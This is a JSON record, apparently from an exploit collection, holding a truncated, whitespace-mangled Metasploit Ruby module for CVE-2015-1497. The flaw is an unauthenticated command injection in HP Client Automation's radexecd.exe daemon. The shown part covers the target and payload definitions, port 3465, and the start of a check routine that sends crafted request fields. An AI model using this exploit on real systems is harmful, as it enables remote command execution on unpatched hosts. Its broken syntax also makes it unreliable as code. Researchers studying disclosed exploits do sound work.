{
    "text": "vul_name : HP Client Automation Command Injection ， vul_cve : CVE-2015-1497 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = GreatRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : CmdStager ， super ( update_info ( info ,  ， 'Name' => 'HP Client Automation Command Injection' ,  ， 'Description' => %q{ ， This module exploits a command injection vulnerability on HP Client Automation , distributed ， actually as Persistent Systems Client Automation. The vulnerability exists in the Notify ， Daemon ( radexecd.exe )  , which doesn't authenticate execution requests by default neither. ， This module has been tested successfully on HP Client Automation 9.00 over Windows 2003 SP2 ， and CentOS 5. ， } ,  ， 'Author' => ，  [  ， 'Ben Turner' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2015-1497' ]  ,  ，  [ 'ZDI' , '15-038' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => %w{ unix win } ,  ， 'DefaultOptions' => ， { ， 'WfsDelay' => 10 ， } ,  ， 'Payload' => {'DisableNops' => true} ,  ， 'Targets' => ，  [  ，  [ 'HP Client Automation 9.0.0 / Linux' ,  ， { ， 'Platform' => 'unix' ,  ， 'Arch' => ARCH_CMD ,  ， 'Payload' => ， { ， 'Space' => 466 ,  ， 'EncoderType' => Msf : Encoder : Type : CmdUnixPerl ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'openssl telnet generic gawk' ， } ,  ， 'BadChars' => \"\\x27\" ， } ， } ，  ]  ,  ，  [ 'HP Client Automation 9.0.0 / Windows' ,  ， { ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_X86 ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Jan 02 2014' )  ， register_options (  ，  [  ， Opt : RPORT ( 3465 )  ，  ]  , self.class )  ， deregister_options ( 'CMDSTAGER : FLAVOR' )  ， deregister_options ( 'CMDSTAGER : DECODER' )  ， end ， def check ， connect ， sock.put ( \"\\x00\" )  # port ， sock.put ( \" # {rand_text_alphanumeric ( 4 + rand ( 3 ) }\\x00\" )  # user ID ， sock.put ( \" # {rand_text_alpha ( 4 + rand ( 3 ) }\\x00\" )  # password ， sock.put ( \"hide\\x00\" )  # command ， res = sock.get_once ， disconnect",
    "time": "2015.02.24"
}